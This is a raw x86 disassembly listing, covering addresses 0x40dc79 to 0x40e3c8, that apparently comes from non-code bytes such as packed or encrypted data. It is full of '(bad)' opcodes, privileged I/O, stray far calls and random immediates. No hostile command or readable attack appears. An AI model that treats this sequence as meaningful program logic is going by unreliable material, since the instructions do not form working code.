  40dc79:	sahf   
  40dc7a:	icebp  
  40dc7b:	ins    DWORD PTR es:[edi],dx
  40dc7c:	dec    ebp
  40dc7d:	sbb    eax,0xd505fdf7
  40dc82:	dec    edi
  40dc83:	cmp    BYTE PTR [edi],0x54
  40dc86:	or     eax,0xdeb6274b
  40dc8b:	mov    dl,0xd0
  40dc8d:	in     al,0x6a
  40dc8f:	push   esp
  40dc90:	sbb    BYTE PTR [ebp-0xc612d2b],dh
  40dc96:	scas   eax,DWORD PTR es:[edi]
  40dc97:	jb     0x40dcce
  40dc99:	das    
  40dc9a:	cmp    edx,DWORD PTR [edi]
  40dc9c:	mov    ss,WORD PTR [eax]
  40dc9e:	(bad)  
  40dc9f:	jmp    0xbf2:0x75f95b76
  40dca6:	aam    0xe6
  40dca8:	mov    edi,0x92d1754a
  40dcad:	dec    esp
  40dcae:	pop    ds
  40dcaf:	mov    eax,ds:0x4390531d
  40dcb4:	and    al,0x15
  40dcb6:	inc    edi
  40dcb7:	(bad)  
  40dcb8:	test   al,0x30
  40dcba:	push   eax
  40dcbb:	ficomp WORD PTR [esi+ebx*1+0x5f6972f6]
  40dcc2:	adc    dl,bl
  40dcc4:	pop    esp
  40dcc5:	mov    edi,0x9c3bfa01
  40dcca:	leave  
  40dccb:	sbb    DWORD PTR [ecx],ecx
  40dccd:	mov    bl,0x46
  40dcd0:	mov    esp,0xc38b2499
  40dcd5:	add    bh,bl
  40dcd7:	add    BYTE PTR [ecx],dh
  40dcd9:	arpl   WORD PTR [eax-0x3047a66a],si
  40dcdf:	(bad)  
  40dce0:	lods   al,BYTE PTR ds:[esi]
  40dce1:	loope  0x40dce1
  40dce3:	xor    eax,0xb19d37a9
  40dce8:	adc    cl,ah
  40dcea:	xchg   ecx,eax
  40dceb:	clc    
  40dcec:	jl     0x40dd22
  40dcee:	adc    bh,ah
  40dcf0:	push   edi
  40dcf1:	and    DWORD PTR [esi-0x1e],ebx
  40dcf4:	xchg   esp,eax
  40dcf5:	and    BYTE PTR ds:0x8eedfc30,0xc0
  40dcfc:	repz clc 
  40dcfe:	mov    ecx,0xab02d53e
  40dd03:	pushf  
  40dd04:	fsubr  DWORD PTR [ebx+0x33]
  40dd07:	(bad)  
  40dd08:	adc    eax,0x449c74ea
  40dd0d:	fdiv   QWORD PTR [edx+eax*2+0x44]
  40dd11:	pushf  
  40dd12:	push   esi
  40dd13:	ins    BYTE PTR es:[edi],dx
  40dd14:	jle    0x40dd0d
  40dd16:	call   0xf091:0x8bfc2a6c
  40dd1d:	pop    ebp
  40dd1e:	not    BYTE PTR [ebp-0x3]
  40dd21:	jae    0x40dd7e
  40dd23:	repz xchg edx,eax
  40dd25:	test   al,bl
  40dd27:	in     eax,0x5e
  40dd29:	jo     0x40dcea
  40dd2b:	in     eax,dx
  40dd2c:	nop
  40dd2d:	ds lock mov dl,0x14
  40dd31:	bnd jo 0x40dd1b
  40dd34:	test   eax,0x621ce93
  40dd39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd3a:	in     eax,dx
  40dd3b:	cmp    BYTE PTR [ebx],al
  40dd3d:	or     dh,bh
  40dd3f:	pop    es
  40dd40:	jp     0x40ddaf
  40dd42:	cmp    dh,ch
  40dd44:	loop   0x40dd8e
  40dd46:	and    al,0x51
  40dd48:	call   0xbe24c596
  40dd4d:	stos   DWORD PTR es:[edi],eax
  40dd4e:	in     eax,dx
  40dd4f:	je     0x40dd7d
  40dd51:	ret    0x995b
  40dd54:	out    dx,eax
  40dd55:	mov    eax,0x5898e9cd
  40dd5a:	pusha  
  40dd5b:	test   eax,0xe95902ce
  40dd60:	cmp    ah,BYTE PTR [esi+0x49]
  40dd63:	in     al,dx
  40dd64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd65:	adc    al,0xca
  40dd67:	inc    ebx
  40dd68:	(bad)  
  40dd69:	xchg   edi,eax
  40dd6a:	push   edi
  40dd6b:	pop    edx
  40dd6c:	hlt    
  40dd6d:	mov    ebp,0xd9975f7b
  40dd72:	iret   
  40dd73:	xor    BYTE PTR [ecx],0xa6
  40dd76:	lea    ebp,[edx]
  40dd78:	cld    
  40dd79:	test   DWORD PTR [esi],eax
  40dd7b:	(bad)  
  40dd7d:	sub    cl,BYTE PTR [edx-0x226ff99b]
  40dd83:	into   
  40dd84:	ja     0x40dddc
  40dd86:	sbb    al,0x6d
  40dd88:	fsubr  DWORD PTR [edi-0x16]
  40dd8b:	push   edx
  40dd8c:	cwde   
  40dd8d:	aad    0x50
  40dd8f:	xor    BYTE PTR [esi-0x1fea99ae],ah
  40dd95:	jne    0x40dd17
  40dd97:	cmp    BYTE PTR [ebx],dl
  40dd99:	adc    al,0xd3
  40dd9b:	sub    ah,BYTE PTR [ebp-0x59]
  40dd9e:	and    al,0x7
  40dda0:	call   0xa868:0xac52e7a3
  40dda7:	push   es
  40dda8:	pop    edx
  40dda9:	jne    0x40ddf8
  40ddab:	call   0xbc15:0x36c97b2f
  40ddb2:	dec    eax
  40ddb3:	fistp  DWORD PTR [edx+0x6defc82b]
  40ddb9:	and    ebx,DWORD PTR [ecx-0x45]
  40ddbc:	inc    ebx
  40ddbd:	fsub   DWORD PTR [eax-0x75]
  40ddc0:	sub    eax,0x66e622b2
  40ddc5:	lods   eax,DWORD PTR ds:[esi]
  40ddc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddc7:	adc    edi,DWORD PTR [edx]
  40ddc9:	mov    DWORD PTR [ebx+0x79],esi
  40ddcc:	in     al,0x21
  40ddce:	mov    ebp,0x908e479a
  40ddd3:	xchg   esi,eax
  40ddd4:	mov    DWORD PTR fs:[ebp+0x16],esp
  40ddd8:	inc    eax
  40ddd9:	fdivr  st,st(6)
  40dddb:	mov    edx,ecx
  40dddd:	inc    edx
  40ddde:	in     eax,dx
  40dddf:	jg     0x40de02
  40dde1:	sbb    esp,edi
  40dde3:	xchg   ecx,eax
  40dde4:	cwde   
  40dde5:	add    ch,BYTE PTR ds:0xcb51ef6
  40ddeb:	cdq    
  40ddec:	cdq    
  40dded:	dec    esi
  40ddee:	add    ebx,0x43ba8180
  40ddf4:	sbb    BYTE PTR [ebx],bh
  40ddf6:	(bad)  
  40ddf8:	and    bl,dh
  40ddfa:	push   cs
  40ddfb:	or     al,0x89
  40ddfd:	sti    
  40ddfe:	out    dx,al
  40ddff:	cmc    
  40de00:	in     eax,0xfd
  40de02:	pop    esi
  40de03:	lods   eax,DWORD PTR ds:[esi]
  40de04:	push   esi
  40de05:	push   ss
  40de06:	dec    esp
  40de07:	push   edi
  40de08:	or     eax,0x76d6d24d
  40de0d:	das    
  40de0e:	sub    dh,bh
  40de10:	mov    eax,0xab3c16f9
  40de15:	shr    DWORD PTR es:[eax-0x1a23916b],1
  40de1c:	inc    esi
  40de1d:	pop    ecx
  40de1e:	out    0x72,al
  40de20:	pop    ds
  40de21:	inc    eax
  40de22:	mov    cl,0xe5
  40de24:	icebp  
  40de25:	add    al,BYTE PTR [eax]
  40de27:	mov    esp,0x19e330c
  40de2c:	cwde   
  40de2d:	rcr    BYTE PTR [ecx-0x77108811],0x95
  40de34:	add    dl,BYTE PTR [ebp+0x6d]
  40de37:	inc    ebp
  40de38:	mov    ds:0x449572d3,eax
  40de3d:	push   ebx
  40de3e:	inc    ebx
  40de3f:	add    ebx,eax
  40de41:	add    BYTE PTR [ebx],al
  40de43:	mov    eax,0x99b7f7c
  40de48:	jmp    0x40dec1
  40de4a:	push   ebx
  40de4b:	fs pusha 
  40de4d:	cmp    ah,cl
  40de4f:	dec    DWORD PTR [ecx+edi*8-0x9]
  40de53:	add    eax,0x1c003d27
  40de58:	mov    ecx,DWORD PTR [esi]
  40de5a:	add    edx,DWORD PTR [eax]
  40de5c:	in     eax,dx
  40de5d:	mov    al,ds:0x9157b75d
  40de62:	inc    edi
  40de63:	retf   0x7f3f
  40de66:	adc    al,0x4f
  40de68:	pusha  
  40de69:	out    dx,eax
  40de6a:	push   ds
  40de6b:	(bad)  
  40de6c:	mov    BYTE PTR [eax],cl
  40de6e:	fwait
  40de6f:	sbb    dl,BYTE PTR [eax]
  40de71:	jecxz  0x40dec3
  40de73:	(bad)  
  40de74:	ins    BYTE PTR es:[edi],dx
  40de75:	inc    esi
  40de76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de77:	pop    es
  40de78:	mov    eax,ds:0x34954e41
  40de7d:	sbb    al,0xf6
  40de7f:	inc    esp
  40de80:	sub    DWORD PTR [ebx-0x53],esp
  40de83:	mov    WORD PTR [ebp+0x2f],cs
  40de86:	in     al,0x1d
  40de88:	jbe    0x40dec3
  40de8a:	cmp    eax,0xca03de39
  40de8f:	js     0x40dead
  40de91:	retf   0xd4b7
  40de94:	call   0x51117bbb
  40de99:	std    
  40de9a:	retf   0xed39
  40de9d:	push   es
  40de9e:	add    al,0x9f
  40dea0:	cwde   
  40dea1:	popa   
  40dea2:	in     eax,0xbf
  40dea4:	addr16 xchg edi,eax
  40dea6:	hlt    
  40dea7:	(bad)  
  40dea9:	xor    DWORD PTR [esi+0x472e7d55],esp
  40deaf:	pusha  
  40deb0:	and    al,0x11
  40deb2:	clc    
  40deb3:	add    eax,DWORD PTR [edi]
  40deb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40deb6:	sahf   
  40deb7:	sub    eax,0x52372495
  40debc:	test   DWORD PTR [ecx-0x9c84db3],esp
  40dec2:	fist   WORD PTR [eax+ebx*8]
  40dec5:	fadd   QWORD PTR [ebp+0x68]
  40dec8:	push   ebp
  40dec9:	icebp  
  40deca:	fidivr DWORD PTR [eax]
  40decc:	push   edx
  40decd:	out    dx,eax
  40dece:	adc    DWORD PTR [esi-0x44ef3976],ebp
  40ded4:	lods   al,BYTE PTR ds:[esi]
  40ded5:	popf   
  40ded6:	mov    ah,0x6f
  40ded8:	inc    ebp
  40ded9:	out    0xf2,eax
  40dedb:	sub    BYTE PTR [edi],dl
  40dedd:	jl     0x40dec2
  40dedf:	jmp    0x2a69c1f8
  40dee4:	pop    ebx
  40dee5:	or     al,ah
  40dee7:	xor    dl,BYTE PTR [ecx+edx*4-0x4b]
  40deeb:	mov    bh,0x40
  40deed:	imul   ebx,DWORD PTR [eax-0xb],0x29637c88
  40def4:	frstor [eax+0x3e]
  40def7:	daa    
  40def8:	mov    edi,0xdac64823
  40defd:	push   ecx
  40defe:	push   0x996a47f3
  40df03:	out    dx,al
  40df04:	cmpxchg DWORD PTR [ecx],esp
  40df07:	dec    ebx
  40df08:	cli    
  40df09:	ja     0x40df3d
  40df0b:	stos   DWORD PTR es:[edi],eax
  40df0c:	pop    es
  40df0d:	out    0xad,al
  40df0f:	push   0xffffffc5
  40df11:	pop    esi
  40df12:	into   
  40df13:	ret    
  40df14:	add    bh,BYTE PTR ds:0x7bf23cd2
  40df1a:	add    BYTE PTR [ebx],dl
  40df1c:	test   BYTE PTR [edx-0x14],bh
  40df1f:	in     eax,0x9c
  40df21:	add    BYTE PTR [ebx],ch
  40df23:	sbb    al,0xf6
  40df25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df26:	mov    ds:0xd4a9c44f,al
  40df2b:	stos   DWORD PTR es:[edi],eax
  40df2c:	mov    al,ds:0x65c27a6f
  40df31:	js     0x40df59
  40df33:	js     0x40df14
  40df35:	adc    BYTE PTR [eax+0x6999d519],cl
  40df3b:	arpl   WORD PTR [ebp+0xfb3a1b],ax
  40df41:	sbb    ebp,edx
  40df43:	loop   0x40df7e
  40df45:	mov    edx,0xb61051b4
  40df4a:	jle    0x40dfad
  40df4c:	adc    eax,0x537ee965
  40df51:	pop    ds
  40df52:	scas   al,BYTE PTR es:[edi]
  40df53:	sbb    ah,BYTE PTR [edx+0x7b]
  40df56:	ret    0xf852
  40df59:	xor    DWORD PTR [eax-0x5d695a60],esp
  40df5f:	enter  0xdf4d,0x89
  40df63:	ret    0xdc12
  40df66:	xchg   esi,eax
  40df67:	sub    al,0x28
  40df69:	dec    edx
  40df6a:	pop    es
  40df6b:	and    al,dl
  40df6d:	adc    ecx,DWORD PTR [edx+0x464bb0cc]
  40df73:	pop    edi
  40df74:	cmp    BYTE PTR [edi+0x24575112],0xf4
  40df7b:	fnsave [ebp+0x67]
  40df7e:	push   eax
  40df7f:	stos   BYTE PTR es:[edi],al
  40df80:	shr    bh,1
  40df82:	stos   BYTE PTR es:[edi],al
  40df83:	mov    ebx,0x4b8e4df7
  40df88:	shl    BYTE PTR [eax-0x78],cl
  40df8b:	dec    esi
  40df8c:	pop    ebp
  40df8d:	vpunpckhqdq ymm1,ymm2,YMMWORD PTR [ebx]
  40df91:	iret   
  40df92:	das    
  40df93:	sub    ecx,esi
  40df95:	inc    ebx
  40df96:	std    
  40df97:	adc    ecx,ecx
  40df99:	imul   ebx,DWORD PTR [edi],0xcad9e68e
  40df9f:	and    BYTE PTR [eax+0x3c0448d],ch
  40dfa5:	jb     0x40df76
  40dfa7:	cdq    
  40dfa8:	rcl    DWORD PTR [ebx+edx*8+0x56],1
  40dfac:	push   edi
  40dfad:	jne    0x40e00f
  40dfaf:	sub    BYTE PTR [ebp+0x74],0x2f
  40dfb3:	cmp    BYTE PTR ds:0xef40a4d1,bl
  40dfb9:	or     eax,0x671fc0d1
  40dfbe:	in     eax,dx
  40dfbf:	fsubr  st(0),st
  40dfc1:	xchg   esi,eax
  40dfc2:	lds    ebx,FWORD PTR [edi+0x1a]
  40dfc5:	(bad)  
  40dfc6:	not    BYTE PTR [eax+ebp*8-0x51]
  40dfca:	and    ecx,DWORD PTR [esi-0x279422b6]
  40dfd0:	dec    edi
  40dfd1:	lds    edi,FWORD PTR [ebx+eax*2]
  40dfd4:	out    0xe7,al
  40dfd6:	icebp  
  40dfd7:	mov    dl,0x9a
  40dfd9:	lods   al,BYTE PTR ds:[esi]
  40dfda:	xchg   ecx,eax
  40dfdb:	mov    ebx,0xdf3c72f1
  40dfe0:	test   ebx,esp
  40dfe2:	mov    edx,0x27612961
  40dfe7:	dec    ebp
  40dfe8:	xor    eax,0x7e9611d7
  40dfed:	xor    al,0xf6
  40dfef:	(bad)  
  40dff0:	psadbw mm7,mm7
  40dff3:	xchg   edi,eax
  40dff4:	pop    esi
  40dff5:	inc    esp
  40dff6:	push   ebp
  40dff7:	adc    BYTE PTR [edi+0x650d6bc4],0xd
  40dffe:	enter  0x4faf,0xdc
  40e002:	dec    esp
  40e003:	ficom  DWORD PTR [eax-0x54e46a30]
  40e009:	aaa    
  40e00a:	mov    eax,ds:0x118b8539
  40e00f:	lods   al,BYTE PTR ds:[esi]
  40e010:	cmp    BYTE PTR [esi+0xeb17fc0],cl
  40e016:	add    DWORD PTR [eax],ebx
  40e018:	adc    ebx,DWORD PTR [esi+eiz*1]
  40e01b:	les    esp,FWORD PTR [edi+eiz*4+0x5d10be6f]
  40e022:	sub    al,0x34
  40e024:	ret    0x902d
  40e027:	cmp    dh,bh
  40e029:	shl    DWORD PTR [ecx],1
  40e02b:	lahf   
  40e02c:	fwait
  40e02d:	shl    esp,cl
  40e02f:	outs   dx,DWORD PTR ds:[esi]
  40e030:	jp     0x40dfe2
  40e032:	sar    BYTE PTR [ebp-0x5d3a66be],cl
  40e038:	std    
  40e039:	inc    esp
  40e03a:	in     eax,0x5
  40e03c:	test   eax,0xa6ea76ea
  40e041:	(bad)  
  40e043:	ret    
  40e044:	push   esp
  40e045:	xchg   esi,eax
  40e046:	or     al,0xe8
  40e048:	jb     0x40e061
  40e04a:	dec    ebx
  40e04b:	into   
  40e04c:	or     eax,0xa0ce0c4e
  40e051:	fmul   DWORD PTR [ecx]
  40e053:	sub    bh,BYTE PTR ds:0x53fb4ead
  40e059:	div    ecx
  40e05b:	pop    edx
  40e05c:	push   eax
  40e05d:	cmc    
  40e05e:	sub    ecx,DWORD PTR [edi+0x4242c7f0]
  40e064:	int    0x58
  40e066:	jns    0x40e035
  40e068:	fidiv  WORD PTR [eax]
  40e06a:	int3   
  40e06b:	mov    ebx,0xb7a3f7e0
  40e070:	push   ds
  40e071:	fs pop eax
  40e073:	inc    esi
  40e074:	xchg   ebp,eax
  40e075:	outs   dx,DWORD PTR ds:[esi]
  40e076:	test   eax,0xc7571596
  40e07b:	pop    ds
  40e07c:	jle    0x40e08e
  40e07e:	mov    cs,WORD PTR [esi+edx*4+0x1758cda0]
  40e085:	push   ebx
  40e086:	jno    0x40e03b
  40e088:	adc    BYTE PTR ds:0xd5582b2f,0x1f
  40e08f:	mov    ds:0x8d1db33c,al
  40e094:	and    al,0x84
  40e096:	popa   
  40e097:	jge    0x40e07a
  40e099:	lock fldcw WORD PTR [eax+eiz*1-0x29ed8510]
  40e0a1:	inc    ebp
  40e0a2:	ror    DWORD PTR [ecx+0x47],0x6f
  40e0a6:	jg     0x40e07b
  40e0a8:	pop    edx
  40e0a9:	xor    al,0xbd
  40e0ab:	test   ebx,edi
  40e0ad:	sbb    DWORD PTR [eax+eax*8-0x48e0b044],edx
  40e0b4:	bnd jbe 0x40e07f
  40e0b7:	das    
  40e0b8:	ret    
  40e0b9:	and    dh,dh
  40e0bb:	and    al,0xd6
  40e0bd:	push   ds
  40e0be:	scas   eax,DWORD PTR es:[edi]
  40e0bf:	or     BYTE PTR [edx+0x6d903a08],0x63
  40e0c6:	loope  0x40e0eb
  40e0c8:	jne    0x40e102
  40e0ca:	outs   dx,DWORD PTR ds:[esi]
  40e0cb:	xchg   esp,eax
  40e0cc:	adc    eax,0x6618774b
  40e0d1:	cmp    BYTE PTR [ebx+0x26],0x17
  40e0d5:	sub    DWORD PTR [ecx-0x5a],0x5ca777ef
  40e0dc:	shr    dh,1
  40e0de:	pop    esi
  40e0df:	sbb    edi,edx
  40e0e1:	out    0x17,al
  40e0e3:	pop    esp
  40e0e4:	jmp    DWORD PTR [edx+0xc0bfdb0]
  40e0ea:	neg    DWORD PTR [edx-0x4546f82]
  40e0f0:	fwait
  40e0f1:	or     esp,ecx
  40e0f3:	and    BYTE PTR [ebp+0x3],bl
  40e0f6:	xor    ch,cl
  40e0f8:	(bad)  
  40e0fa:	(bad)  
  40e0fb:	(bad)  
  40e0fc:	outs   dx,BYTE PTR ds:[esi]
  40e0fd:	test   eax,0x3f5d954c
  40e102:	mov    al,0x22
  40e104:	jecxz  0x40e183
  40e106:	(bad)  [ecx+0x31]
  40e109:	mov    ds:0xef478cd2,eax
  40e10e:	aam    0xe6
  40e110:	je     0x40e0a5
  40e112:	cmp    bl,BYTE PTR [esp+ecx*4+0x2a]
  40e116:	xchg   edx,eax
  40e117:	jmp    0x40e0da
  40e119:	pop    ds
  40e11a:	fisttp WORD PTR [esi-0x41c2278d]
  40e120:	shr    esp,cl
  40e122:	jb     0x40e169
  40e124:	xor    al,0x74
  40e126:	rcl    eax,1
  40e128:	and    BYTE PTR [edi+0x20a696b6],dl
  40e12e:	test   BYTE PTR [edi+0x2a524abc],bh
  40e134:	rcr    DWORD PTR [edi],0x7a
  40e137:	mov    ebx,0xebc99ad5
  40e13c:	leave  
  40e13d:	inc    ebp
  40e13e:	pusha  
  40e13f:	mov    ds:0xb1de38ed,al
  40e144:	fdivr  DWORD PTR [ecx-0x47]
  40e147:	out    dx,eax
  40e148:	rcr    DWORD PTR [ebx-0x6c4cd8f1],1
  40e14e:	in     al,dx
  40e14f:	add    BYTE PTR [edx],bh
  40e151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e152:	push   ecx
  40e153:	fwait
  40e154:	cmp    BYTE PTR [edi],dh
  40e156:	sbb    al,0xe1
  40e158:	test   DWORD PTR [edx+0x7259fe44],0x82abd535
  40e162:	sbb    BYTE PTR [bp+di+0x2b],bl
  40e166:	cmp    BYTE PTR [esi-0x11],al
  40e169:	test   BYTE PTR [ebp+0x174dd8d],cl
  40e16f:	test   DWORD PTR [ebp+0x12],esi
  40e172:	shr    DWORD PTR [eax],cl
  40e174:	(bad)  
  40e175:	in     al,dx
  40e176:	pop    edi
  40e177:	xor    bh,ah
  40e179:	aam    0x8a
  40e17b:	iret   
  40e17c:	push   ebp
  40e17d:	arpl   WORD PTR [ebx+0x3aadbe4],cx
  40e183:	shl    DWORD PTR [esi-0x28],0xf1
  40e187:	sbb    al,0x92
  40e189:	push   cs
  40e18a:	enter  0x98e7,0x22
  40e18e:	push   edx
  40e18f:	fstp   DWORD PTR [edi+0x4e]
  40e192:	rol    DWORD PTR [edx+edx*8-0x1b888f96],cl
  40e199:	and    eax,0x8522043
  40e19e:	jo     0x40e1eb
  40e1a0:	xchg   ebp,eax
  40e1a1:	mov    al,ds:0x2ffb8653
  40e1a6:	jmp    0x40e12d
  40e1a8:	pop    edi
  40e1a9:	sbb    BYTE PTR [ebx-0x250f7d4b],0x65
  40e1b0:	stos   BYTE PTR es:[edi],al
  40e1b1:	std    
  40e1b2:	je     0x40e15e
  40e1b4:	je     0x40e19d
  40e1b6:	fdivr  QWORD PTR [ecx-0x20]
  40e1b9:	xor    ebx,0xffffffd0
  40e1bc:	xchg   DWORD PTR [esi],ebp
  40e1be:	dec    eax
  40e1bf:	jecxz  0x40e225
  40e1c1:	inc    esp
  40e1c2:	mov    dl,0x7
  40e1c4:	push   ebx
  40e1c5:	aas    
  40e1c6:	imul   ebx,DWORD PTR [esi],0xffffffdf
  40e1c9:	jo     0x40e1f3
  40e1cb:	pop    edx
  40e1cc:	push   ss
  40e1cd:	aad    0xd7
  40e1cf:	pop    esp
  40e1d0:	ret    
  40e1d1:	xor    al,0x96
  40e1d3:	xor    DWORD PTR [edx+0x2c],ecx
  40e1d6:	imul   esp,ecx,0x26
  40e1d9:	repnz cmp DWORD PTR [ebx-0x43],0x4da2a7cf
  40e1e1:	fld    TBYTE PTR [edi+edi*2+0x16]
  40e1e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1e6:	lds    ecx,FWORD PTR [ecx]
  40e1e8:	pushf  
  40e1e9:	repz xchg edx,eax
  40e1eb:	xchg   BYTE PTR [edx+0x4a],cl
  40e1ee:	push   cs
  40e1ef:	push   ecx
  40e1f0:	dec    edx
  40e1f1:	xlat   BYTE PTR ds:[ebx]
  40e1f2:	data16 adc BYTE PTR [edx-0x37ffa30d],ch
  40e1f9:	repnz in al,0x91
  40e1fc:	xchg   BYTE PTR [eax],dl
  40e1fe:	sbb    DWORD PTR [ebx-0x46],0x1f4236e3
  40e205:	xchg   ebp,eax
  40e206:	outs   dx,DWORD PTR ds:[esi]
  40e207:	rcl    ebp,0x70
  40e20a:	stc    
  40e20b:	cli    
  40e20c:	dec    ebp
  40e20d:	add    BYTE PTR [ebp+0xc57258c],ah
  40e213:	call   0x6c8:0x8bff4d8b
  40e21a:	sbb    esi,ebp
  40e21c:	jmp    0x5b1d6481
  40e221:	jno    0x40e1d1
  40e223:	mov    ecx,0xd02934de
  40e228:	imul   edi,ebx,0xffffff98
  40e22b:	and    bh,bh
  40e22d:	div    dl
  40e22f:	add    ebp,ebp
  40e231:	loope  0x40e1c0
  40e233:	pop    eax
  40e234:	int3   
  40e235:	pop    esp
  40e236:	les    edi,FWORD PTR [eax+0x239103e]
  40e23c:	pop    ds
  40e23d:	aad    0x62
  40e23f:	aam    0x87
  40e241:	mov    dh,0xea
  40e243:	leave  
  40e244:	xor    eax,0x37660415
  40e249:	xor    al,al
  40e24b:	and    ebx,DWORD PTR ss:[eax-0x150e1c75]
  40e252:	imul   ebx,DWORD PTR [esi],0xeea0c038
  40e258:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e259:	(bad)  
  40e25b:	das    
  40e25c:	fiadd  WORD PTR [edi]
  40e25e:	sub    eax,0x27bc6809
  40e263:	jae    0x40e2c4
  40e265:	pop    edx
  40e266:	fwait
  40e267:	arpl   WORD PTR [eax],ax
  40e269:	xor    DWORD PTR [eax+0x9f68543],ecx
  40e26f:	sbb    cl,cl
  40e271:	not    BYTE PTR [ebp-0x7090516]
  40e277:	ret    
  40e278:	or     DWORD PTR [ecx+0x480a99c6],esi
  40e27e:	mov    bh,0x84
  40e280:	push   ebx
  40e281:	pop    esp
  40e282:	push   ebx
  40e283:	(bad)  
  40e284:	or     ah,ah
  40e286:	fcmovnb st,st(7)
  40e288:	cli    
  40e289:	adc    ah,BYTE PTR [ebx-0x31e08879]
  40e28f:	dec    ecx
  40e290:	test   BYTE PTR [edi-0x24],ch
  40e293:	mov    WORD PTR [ecx+0x2f4bbf6],fs
  40e299:	js     0x40e266
  40e29b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e29c:	mov    ss,WORD PTR [ebp-0x5f]
  40e29f:	gs in  al,0xd0
  40e2a2:	mov    ebp,DWORD PTR [ecx-0x23]
  40e2a5:	xchg   ecx,eax
  40e2a6:	inc    edi
  40e2a7:	sar    DWORD PTR [ebp+0x28],1
  40e2aa:	gs push ecx
  40e2ac:	jg     0x40e2e8
  40e2ae:	ds pop edx
  40e2b0:	mov    dh,0xe4
  40e2b2:	jbe    0x40e288
  40e2b4:	dec    ebp
  40e2b5:	push   ebx
  40e2b6:	or     BYTE PTR [ecx-0x23],cl
  40e2b9:	je     0x40e240
  40e2bb:	aaa    
  40e2bc:	shl    BYTE PTR [edi-0x67],cl
  40e2bf:	scas   al,BYTE PTR es:[edi]
  40e2c0:	jnp    0x40e290
  40e2c2:	outs   dx,DWORD PTR ds:[esi]
  40e2c3:	mov    ecx,0xa0f90b16
  40e2c8:	and    BYTE PTR [ecx+0x2c],ch
  40e2cb:	mov    BYTE PTR [edx],ah
  40e2cd:	pop    edi
  40e2ce:	mov    esi,0x85a3478b
  40e2d3:	inc    esp
  40e2d4:	mov    esp,0x8a81b05c
  40e2d9:	int3   
  40e2da:	mov    dh,0x3a
  40e2dc:	out    0xe1,eax
  40e2de:	xchg   esp,eax
  40e2df:	outs   dx,BYTE PTR ds:[esi]
  40e2e0:	xchg   ecx,eax
  40e2e1:	icebp  
  40e2e2:	pop    edi
  40e2e3:	pop    edx
  40e2e4:	cmp    bh,BYTE PTR [esi]
  40e2e6:	or     dh,dl
  40e2e8:	pushf  
  40e2e9:	es (bad) 
  40e2eb:	(bad)  
  40e2ec:	pop    edi
  40e2ed:	pop    ecx
  40e2ee:	gs cmc 
  40e2f0:	xchg   ah,ch
  40e2f2:	adc    al,0xe4
  40e2f4:	cs fs popf 
  40e2f7:	enter  0xc21a,0x93
  40e2fb:	dec    edx
  40e2fc:	ins    DWORD PTR es:[edi],dx
  40e2fd:	xor    esp,ecx
  40e2ff:	push   ds
  40e300:	pop    ebp
  40e301:	xor    al,0x0
  40e303:	mov    BYTE PTR [ebx+0x21],ch
  40e306:	jl     0x40e369
  40e308:	inc    edi
  40e309:	call   0x3472:0xfdc41d7e
  40e310:	fmul   DWORD PTR [ebx+0x6b]
  40e313:	mov    ch,0x16
  40e315:	pop    es
  40e316:	std    
  40e317:	cld    
  40e318:	pop    esp
  40e319:	jp     0x40e2ee
  40e31b:	pop    ecx
  40e31c:	aam    0xce
  40e31e:	int3   
  40e31f:	std    
  40e320:	sbb    bh,ah
  40e322:	lods   eax,DWORD PTR ds:[esi]
  40e323:	xchg   DWORD PTR [edi+eiz*1+0x64052ef2],esp
  40e32a:	imul   edx,DWORD PTR [edx+0x60],0x3
  40e32e:	mov    dh,0xc2
  40e330:	push   edx
  40e331:	addr16 xchg ebp,eax
  40e333:	repz retf 0x11b4
  40e337:	sub    DWORD PTR [ebx-0x34],0x814a61f0
  40e33e:	pop    edx
  40e33f:	rcl    DWORD PTR [eax+0x5a2d8b08],0x61
  40e346:	jg     0x40e2ee
  40e348:	fidiv  DWORD PTR [bp+si]
  40e34b:	pop    eax
  40e34c:	dec    edi
  40e34d:	out    dx,al
  40e34e:	xor    DWORD PTR [eax],0xffffff92
  40e351:	xchg   esi,eax
  40e352:	ret    0x8978
  40e355:	imul   edi,DWORD PTR [ebx],0x1104e198
  40e35b:	or     al,0x7a
  40e35d:	bound  ebx,QWORD PTR [ebx]
  40e35f:	lea    ebp,es:[edx-0x3b]
  40e363:	dec    ecx
  40e364:	pop    es
  40e365:	(bad)  
  40e366:	fsub   DWORD PTR [edx]
  40e368:	cli    
  40e369:	out    dx,eax
  40e36a:	mov    ebx,DWORD PTR [eax-0xd]
  40e36d:	or     BYTE PTR [edx+ebx*8+0x16],al
  40e371:	std    
  40e372:	addr16 cwde 
  40e374:	jle    0x40e3c2
  40e376:	xchg   DWORD PTR [ebp-0x266992ad],ecx
  40e37c:	loope  0x40e38a
  40e37e:	in     eax,0x19
  40e380:	push   edx
  40e381:	push   eax
  40e382:	aas    
  40e383:	xchg   edi,eax
  40e384:	inc    ecx
  40e385:	std    
  40e386:	mov    al,0xbb
  40e388:	pop    esp
  40e389:	xchg   esp,eax
  40e38a:	sub    DWORD PTR [edi-0x55],esp
  40e38d:	lods   eax,DWORD PTR ds:[esi]
  40e38e:	or     eax,0x4f1f2d56
  40e393:	pop    ds
  40e394:	push   DWORD PTR [edx+0x2a]
  40e397:	int3   
  40e398:	ja     0x40e382
  40e39a:	sub    DWORD PTR [ecx+0x35],esp
  40e39d:	mov    al,ds:0xa38f806b
  40e3a2:	adc    DWORD PTR [ebp+0x7579a933],ebp
  40e3a8:	xor    esi,DWORD PTR [ecx+0x1c]
  40e3ab:	cmp    ecx,DWORD PTR [esi+0x19]
  40e3ae:	mov    WORD PTR [esi],gs
  40e3b0:	mov    cl,0x75
  40e3b2:	(bad)  
  40e3b4:	jns    0x40e428
  40e3b6:	add    eax,0x6ae4f7d6
  40e3bb:	adc    eax,0x4e61fd44
  40e3c0:	sub    ch,BYTE PTR [ecx+0x38e17967]
  40e3c6:	ja     0x40e3ae
  40e3c8:	test   BYTE PTR [edx-0x33ca8a53],0x52
